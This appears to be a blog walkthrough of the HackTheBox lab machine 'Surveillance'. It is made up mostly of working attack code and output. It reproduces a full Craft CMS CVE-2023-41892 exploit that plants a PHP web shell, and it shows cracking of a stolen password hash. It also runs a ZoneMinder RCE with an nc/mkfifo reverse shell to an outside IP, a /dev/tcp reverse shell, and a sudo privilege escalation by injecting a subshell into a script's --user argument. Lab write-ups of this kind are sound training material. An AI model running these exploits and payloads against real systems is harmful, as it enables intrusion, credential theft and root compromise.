---
layout: post
title: "HackTheBox: Surveillance"
image: /assets/thumbnails/surveillance-thumbnail.png
---

> This is the walkthrough of the machine Surveillance on HackTheBox. This box is rated as Medium and I would agree since it rquires critical thinking. It involves some simple Python coding and understanding, basic enumeration tactics and some more intermediate privilege escalation techniques. It is a great opportunity for beginners to learn some common and important concepts in penetration testing. 

---

First, we do an Nmap service and version scan. We find that SSH is running on port 22/TCP and also 1 HTTP ports - 80/TCP. 
Also, the target host is UNIX-based.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~]
└─$ <span class="highlight-command">nmap -sV -sC 10.10.11.245</span>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 13:33 EST
Nmap scan report for 10.10.11.245
Host is up (0.081s latency).
Not shown: 905 closed tcp ports (conn-refused), 92 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
<span class="highlight-output">22/tcp   open  ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span>
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.57 seconds
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Enumerating the open ports and listening services using Nmap.</figcaption>
</figure>

Port 80/TCP contains a redirect to http://surveillance.htb/. In order access the domain, we have to first add it to the /etc/hosts 
file. We can use the vim editor to edit the file. Then add the IP address and the surveillance.htb domain. To save and exit,
click the Esc button and then type ":wq".

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~]
└─$ <span class="highlight-command">sudo vim /etc/hosts</span>                
[sudo] password for kali: 


127.0.0.1	localhost
127.0.1.1	kali

::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters


<span class="highlight-output">10.10.11.245     surveillance.htb</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Adding the domain surveillance.htb to the /etc/hosts file.</figcaption>
</figure>

After opening http://surveillance.htb in a browser, we can scroll all the way down to the bottom of the page and we can see that 
the website is created using Craft CMS. CMS stands for Content Management System. Other popular CMSs are WordPress, Joomla and Drupal.

![craft cms](/assets/img/projects-img/surveillance-craft-cms.png)

<figure>
  <figcaption class="figcaption-style">Discovering target is running Craft CMS.</figcaption>
</figure>

Since searching with Searchsploit revealed only old exploits, I googled "Craft CMS exploit" and got a very recent 
[Common Vulnerabilities and Exposures (CVE) entry](https://www.cvedetails.com/cve/CVE-2023-41892/) with ID CVE-2023-41892. This is 
a Remote Code Execution (RCE) vulnerability that affects Craft CMS versions prior to 4.4.15. While I was unable to determine the 
exact version of Craft CMS that the target is running, I also could not find any other possible attack vectors. There is a login 
portal at the `/admin/login` endpoint which I couldn't brute force with common credentials like admin:administrator etc., and 
also a `/web.config` endpoint that contains redirection rules but nothing unusual. 

So, I decided to proceed with the exploit. There is a publicly available Proof-of-Concept (PoC) on 
[GitHub](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) written in Python. I copied the script to my local machine,
saved it as CVE-2023-41892-POC.py and ran it. The script seemed to execute and even provide a reverse shell but running commands through 
it resulted in no output.


<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 craft_poc.py http://surveillance.htb/</span>
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ <span class="highlight-command">id</span>
$ <span class="highlight-command">id</span>
$ <span class="highlight-command">pwd</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Executing the PoC but no command output.</figcaption>
</figure>

I decided to examine the Python script to check for irregularities. Simply said, the script exploits a command injection vulnerability 
by imbedding PHP code inside an image. It then triggers the PHP library Imagick to execute commands on the server by writing PHP shell 
code to the image. 

I made a few changes to the code. Firstly, I removed the proxy parameters from the requests sent to the server. It seems like those were
added by the author for debugging purposes. Secondly, I wanted to test what values the variables upload_tmp_dir and documentRoot had 
in the main function before writing the payload to the document root. For this reason, I simply added statements to print them and 
observe. You can see the changes highlighted below.

<pre class="grey-code">
	<code>
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
        "image1": ("pwn1.msl", "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;image&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;read filename=&quot;caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;&quot;/&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;write filename=&quot;info:DOCUMENTROOT/shell.php&quot;&gt;&NewLine;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/image&gt;".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files<span class="highlight-output">, proxies={"http": "http://localhost:8080"}</span>)


def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'
    pattern2 = r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;'

    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data<span class="highlight-output">, proxies={"http": "http://localhost:8080"}</span>)    

def shell(cmd):
    response = requests.get(url + "/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py &lt;url&gt;")
        exit()
    else:

        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        <span class="highlight-output">print("TEST - printing tmp upload directory and document root")</span>
        <span class="highlight-output">print(upload_tmp_dir)</span>
        <span class="highlight-output">print(documentRoot)</span>
        tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
    </code>
</pre>

<figure>
  <figcaption class="figcaption-style">Deleting the proxy routing parameters and adding print statements for debugging purposes to the PoC.</figcaption>
</figure>

After saving my changes, I ran the script again. It seems like the script was able to correctly pull the root directory from the 
server (`documentRoot`). The value of `upload_tmp_dir` seems to be the string "&lt;i&gt;no value&lt;/i&gt;". However, executing commands still 
did not work.

<pre class="grey-code">
	<code>
──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 CVE-2023-41892-POC.py http://surveillance.htb/</span>          
[-] Get temporary folder and document root ...
TEST - printing tmp upload directory and document root
<span class="highlight-output">&lt;i&gt;no value&lt;/i&gt;</span>
<span class="highlight-output">/var/www/html/craft/web</span>
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ <span class="highlight-command">id</span>
$
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Testing for the value of upload_tmp_dir and documentRoot.</figcaption>
</figure>

In the main function of the original PoC script, we can see that a check is performed if the value of `upload_tmp_dir` is equal
to the string "no value". If so, the variable `tmpDir` is assigned the value "/tmp" and is used to trigger Imagick afterwards. 
However, from the output of my latest run of the script I found that the value of `upload_tmp_dir` is actually "&lt;i&gt;no value&lt;/i&gt;" 
which is not the same as "no value". This means that the check most likely fails and the variable `tmpDir` gets assigned the value of 
`upload_tmp_dir` instead of "/tmp". So, I changed the statement to instead check if the value of `upload_tmp_dir` is "&lt;i&gt;no value&lt;/i&gt;". 
I also added a print satement afterwards to confirm that `tmpDir` equals "/tmp".


<pre class="grey-code">
	<code>
&lt;SNIP&gt;

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py &lt;url&gt;")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        print("TEST - printing tmp upload directory and document root")
        print(upload_tmp_dir)
        print(documentRoot)

        <span class="highlight-output">tmpDir = "/tmp" if upload_tmp_dir == "&lt;i&gt;no value&lt;/i&gt;" else upload_tmp_dir</span>
        <span class="highlight-output">print("Value of tmpDir is:")</span>
        <span class="highlight-output">print(tmpDir)</span>

        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Fixing the if-statement to correctly check for the value of uplad_tmp_dir.</figcaption>
</figure>


I then ran the script again. In the output we can see that the value of `upload_tmp_dir` is now "&lt;i&gt;no value&lt;/i&gt;" and that the 
value of `tmpDir` is now correctly assigned as "/tmp". Another clear sign that the script works is the fact that I was now able 
to execute commands successfully. From the output of my commands, there are two main takeaways - the Craft CMS app is running in 
the context of user www-data and there is a very interesting Sever Query Language (SQL) compressed backup file called 
"surveillance--2023-10-17-202801--v4.4.14.sql.zip".


<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 CVE-2023-41892-POC.py http://surveillance.htb/</span>
[-] Get temporary folder and document root ...
TEST - printing tmp upload directory and document root
&lt;i&gt;no value&lt;/i&gt;
/var/www/html/craft/web
<span class="highlight-output">Value of tmpDir is:</span>
<span class="highlight-output">/tmp</span>
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ <span class="highlight-command">ls</span>
cpresources
css
fonts
images
img
index.php
js
shell.php
<span class="highlight-output">surveillance--2023-10-17-202801--v4.4.14.sql.zip</span>
web.config
$ <span class="highlight-command">whoami</span>
<span class="highlight-output">www-data</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Executing the PoC and receiving a working reverse shell.</figcaption>
</figure>


I also enumerated the users on the server and found matthew and zoneminder.

<pre class="grey-code">
	<code>
$ <span class="highlight-command">ls /home</span>
<span class="highlight-output">matthew</span>
<span class="highlight-output">zoneminder</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Enumerating users on the target machine.</figcaption>
</figure>



Then I decided to transfer the SQL backup to my machine for closer inspection. In order to do that, I used a Python web server. First, I checked if Python was installed on the server, and then I used it to host a simple HTTP server. If no port is specified, Python hosts the server on default port 8000.

<pre class="grey-code">
	<code>
$ <span class="highlight-command">which python3</span>
<span class="highlight-output">/usr/bin/python3</span>
$ <span class="highlight-command">python3 -m http.server</span>
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Confirming Python 3 is installed and using it to start a simple HTTP server.</figcaption>
</figure>


I then downloaded the file to my machine from the Python server on the target.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">wget http://10.10.11.245:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip</span>     
--2024-02-07 06:57:39--  http://10.10.11.245:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
Connecting to 10.10.11.245:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19918 (19K) [application/zip]
Saving to: ‘surveillance--2023-10-17-202801--v4.4.14.sql.zip’

surveillance--2023-10-17-2028 100%[==============================================>]  19.45K  --.-KB/s    in 0.06s   

2024-02-07 06:57:39 (322 KB/s) - ‘surveillance--2023-10-17-202801--v4.4.14.sql.zip’ saved [19918/19918]
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Downloading the SQL backup to my local machine from the Python server.</figcaption>
</figure>

And decopmressed the archive to extract the SQL file.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip</span>
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql  
	</code>
</pre>

<figure>
  <figcaption class="figcaption-style">Decompressing the backup file.</figcaption>
</figure>

Inside the file I found an insertion statement that adds a new entry in table "users". The entry contains the name of the user - Matthew, their role - admin, and a password hash.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">cat surveillance--2023-10-17-202801--v4.4.14.sql</span>
&lt;SNIP&gt;
--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,<span class="highlight-output">'admin','Matthew B','Matthew','B','admin@surveillance.htb','3&lt;REDACTED&gt;c'</span>,'2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;

&lt;SNIP&gt;
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Inspecting the contents of the SQL backup file and discovering the password hash for user Matthew.</figcaption>
</figure>

In order to crack the hash, I first had to find out what it is. I used `hash-identifier` and it determined that the most likely hashing algorithm was SHA-256.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">hash-identifier</span>
&lt;SNIP&gt;
--------------------------------------------------
 HASH: <span class="highlight-command">3&lt;REDACTED&gt;c</span>

Possible Hashs:
<span class="highlight-output">[+] SHA-256</span>
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Using the tool hash-identifier to find the most likely hashing algorithm.</figcaption>
</figure>

Then I used Hashcat in module 1400 to crack the hash and extract the cleartext password. To find the correct module number for my hash I consulted [this table](https://hashcat.net/wiki/doku.php?id=example_hashes) available online.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">hashcat -m 1400 &lt;REDACTED&gt; /usr/share/wordlists/rockyou.txt</span>
hashcat (v6.2.6) starting

&lt;SNIP&gt;

<span class="highlight-output">3&lt;REDACTED&gt;c:s&lt;REDACTED&gt;0</span>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 3&lt;REDACTED&gt;c
Time.Started.....: Wed Feb  7 07:14:09 2024 (2 secs)
Time.Estimated...: Wed Feb  7 07:14:11 2024 (0 secs)
Kernel.Feature...: Pure Kernel
&lt;SNIP&gt;
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Using the tool Hashcat to crack the password hash and reveal the clear-text password.</figcaption>
</figure>

Since I found a user on the host called matthew, I connected to the host via SSH as matthew using the newly obtained password.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">ssh matthew@10.10.11.245</span>                     
matthew@10.10.11.245's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
&lt;SNIP&gt;

Last login: Wed Feb  7 19:40:49 2024 from 10.10.15.27
matthew@surveillance:~$ <span class="highlight-command">whoami</span>
<span class="highlight-output">matthew</span>
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Using the password to connect to the target with SSH.</figcaption>
</figure>

As user matthew, I enumerated all TCP connections and the services running. I found a service running on localhost (127.0.0.1) port 8080/TCP. 

<pre class="grey-code">
	<code>
matthew@surveillance:~$ <span class="highlight-command">netstat -antp</span>
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 <span class="highlight-output">127.0.0.1:8080</span>          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0    248 10.10.11.245:22         10.10.15.14:47500       ESTABLISHED -                   
tcp        0      1 10.10.11.245:37232      8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Discovering a service listening on port 8080/TCP on the localhost interface.</figcaption>
</figure>

This is most likely a web application given the port number. To make sure, I used `curl` and indeed got a response back.

<pre class="grey-code">
	<code>
matthew@surveillance:~$ <span class="highlight-command">curl http://127.0.0.1:8080</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta charset="utf-8"&gt;
  &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
  &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
  &lt;title>ZM - Login&lt;/title&gt;

  &lt;link rel="icon" type="image/ico" href="graphics/favicon.ico"/&gt;
  &lt;link rel="shortcut icon" href="graphics/favicon.ico"/&gt;

&lt;SNIP&gt;
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Confirming web application listening on port 8080/TCP on the localhost interface.</figcaption>
</figure>

In order to examine the application more closely, I forwarded local port 1234 to remote port 8080 through SSH.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~]
└─$ <span class="highlight-command">ssh -L 1234:localhost:8080 matthew@10.10.11.245</span>
matthew@10.10.11.245's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
&lt;SNIP&gt;

Last login: Thu Feb  8 11:51:34 2024 from 10.10.15.14
matthew@surveillance:~$ 
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Setting up a local port forward using SSH.</figcaption>
</figure>

{% include explanation-box.html content="Local port forwarding through SSH is a technique where we tunnel network traffic via SSH from a port local to our machine (1234) to a port on a remote machine (8080). In other words, we forward all traffic sent to our local port 1234 to port 8080 on the target machine (via our SSH connection). This gives us more freedom in enumerating remote ports since we can use tools that we do not have on the remote machine (like a browser)." %}

Once the port forwarding is complete, we can open the web application in a browser by navigating to http://localhost:1234/.

![port-forward-browser](/assets/img/projects-img/surveillance-port-forward-browser.png){: class="center-image"}

<figure>
  <figcaption class="figcaption-style">Opening the web application in a browser using our port forward.</figcaption>
</figure>

The web application running is ZoneMinder. I was able to successfully authenticate using the username "admin" and the password for user matthew obtained in an earlier step. Once I logged in, I found the version of the ZoneMinder application - 1.36.32.


![zm-version](/assets/img/projects-img/surveillance-zm-version.png){: class="center-image"}

<figure>
  <figcaption class="figcaption-style">Finding the ZoneMinder application version after successful authentication.</figcaption>
</figure>

A quick check online revealed that this version suffers from a critical vulnerability - unauthenticated RCE. And I even found a [PoC](https://raw.githubusercontent.com/heapbytes/CVE-2023-26035/main/poc.py) available online. I downloaded the script and renamed it to "zm_poc.py".

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">wget https://raw.githubusercontent.com/heapbytes/CVE-2023-26035/main/poc.py</span>      
--2024-02-08 08:15:55--  https://raw.githubusercontent.com/heapbytes/CVE-2023-26035/main/poc.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2123 (2.1K) [text/plain]
Saving to: ‘poc.py’

poc.py                        100%[==============================================>]   2.07K  --.-KB/s    in 0s      

2024-02-08 08:15:55 (9.76 MB/s) - ‘poc.py’ saved [2123/2123]

┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">mv poc.py zm_poc.py</span>  
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Downloading a publicly avaiable PoC for the critical vulnerability in ZoneMinder and renaming it for convenience.</figcaption>
</figure>

In order to receive the call back I started a listener on port 1338 on my local machine.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">nc -lnvp 1338</span>
listening on [any] 1338 ...
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Starting a listener on my local machine using Netcat in order to catch the reverse connection initiated by the PoC.</figcaption>
</figure>

Then I used a reverse shell command from [revshells.com](https://www.revshells.com/) to initiate the reverse connection.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">python3 zm_poc.py --target http://127.0.0.1:1234/ --cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.14 1338 >/tmp/f'</span>
Fetching CSRF Token
Got Token: key:34edd1bcf6cd9e8086243798b2dc74e54a81bb9c,1707399080
[>] Sending payload..
[!] Script executed by out of time limit (if u used revshell, this will exit the script)
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Running the PoC with a Bash reverse shell command.</figcaption>
</figure>

I received the call back on my listener and confirmed that the process runs in the context of user zoneminder.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">nc -lnvp 1338</span>
listening on [any] 1338 ...
connect to [10.10.15.14] from (UNKNOWN) [10.10.11.245] 55326
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ <span class="highlight-command">id</span>  
id
<span class="highlight-output">uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)</span>
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Receiving the callback initiated by the PoC and confirming access as user zoneminder.</figcaption>
</figure>

As zoneminder, I checked if the user can run any commands as root and found that they can run all Perl scripts in /usr/bin that are related to the ZoneMinder application. Furthermore, they can also add any arguments.

<pre class="grey-code">
	<code>
zoneminder@surveillance:~$ <span class="highlight-command">sudo -l</span>
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    <span class="highlight-output">(ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *</span>
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Enumerating the sudo rights of user zoneminder.</figcaption>
</figure>

I filtered to find all scripts that match the aforementioned criteria.

<pre class="grey-code">
	<code>
zoneminder@surveillance:~$ <span class="highlight-command">ls /usr/bin | grep zm | grep .pl</span>
ls /usr/bin | grep zm | grep .pl
zmaudit.pl
zmcamtool.pl
zmcontrol.pl
zmdc.pl
zmfilter.pl
zmonvif-probe.pl
zmonvif-trigger.pl
zmpkg.pl
zmrecover.pl
zmstats.pl
zmsystemctl.pl
zmtelemetry.pl
zmtrack.pl
zmtrigger.pl
zmupdate.pl
zmvideo.pl
zmwatch.pl
zmx10.pl
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Filtering the Perls scripts that match the aforementioned criteria.</figcaption>
</figure>

Since I could run these scripts with root privileges, I needed to find one that can spawn processes. Or in other words, I needed to find one that can execute other scripts/executables/commands. I found multiple that support such a functionality like zmonvif-trigger.pl, zmtrigger.pl and zmupdate.pl. While I was able to get the host to connect back to my machine using commands like `sudo /usr/bin/zmonvif-trigger.pl /bin/bash -i >& /dev/tcp/10.10.15.14/1339 0>&1` I was not able to get an actual shell. While trying different options, I came accross an interesting line in the ouput from `zmupdate.pl`. In order to update the database, the script actually executes a MySQL command.

<pre class="grey-code">
	<code>
zoneminder@surveillance:~$ <span class="highlight-command">sudo /usr/bin/zmupdate.pl --version=1 --user='zoneminder' --pass=SomePass</span>
<.pl --version=1 --user='zoneminder' --pass=SomePass

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
ERROR 1045 (28000): Access denied for user 'zoneminder'@'localhost' (using password: YES)
Output: 
Command <span class="highlight-output">'mysql -uzoneminder -p'SomePass' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql'</span> exited with status: 1
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Running the zmupdate.pl script and discovering it runs a mysql command.</figcaption>
</figure>

The command being executed is: `mysql -uzoneminder -p'SomePass' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql`

There are 2 user-supplied parameters - user (-u) and password (-p). Therefore, if we can figure out a way to inject a command into any one of these two parameters, the system will execute them with root privileges. To inject a command, we can use a sub-shell.

{% include explanation-box.html content="A sub-shell is a child shell spawned by the main shell (parent shell). The sub-shell is a separate process with its own set of variables and command history and allows the user to execute commands within a separate environment. Since the sub-shell proccess is spawned by its parent process, it will inherit its privileges." %}

Before using a sub-shell injection, I first started a listener on my local machine to recive the callback.

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">nc -lnvp 1339</span>
listening on [any] 1339 ...
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Starting a listener on my local machine.</figcaption>
</figure>

Then I used a reverse shell command (shown earlier) inside a sub-shell. I used this payload in the user parameter of the script. I also tried using it in the password parameter but it didn't work. 

<pre class="grey-code">
	<code>
zoneminder@surveillance:~$ <span class="highlight-command">sudo /usr/bin/zmupdate.pl --version=1 --user='$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.14 1339 >/tmp/f)' --pass=SomePass</span>
< 2>&1|nc 10.10.15.14 1339 >/tmp/f)' --pass=SomePass

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Running the zmupdate.pl script with a sub-shell in the user parameter. The sub-shell carries the reverse shell payload.</figcaption>
</figure>

During the execution of the script, the command executed will be: `mysql -u$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.14 1339 >/tmp/f) -p'SomePass' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql`

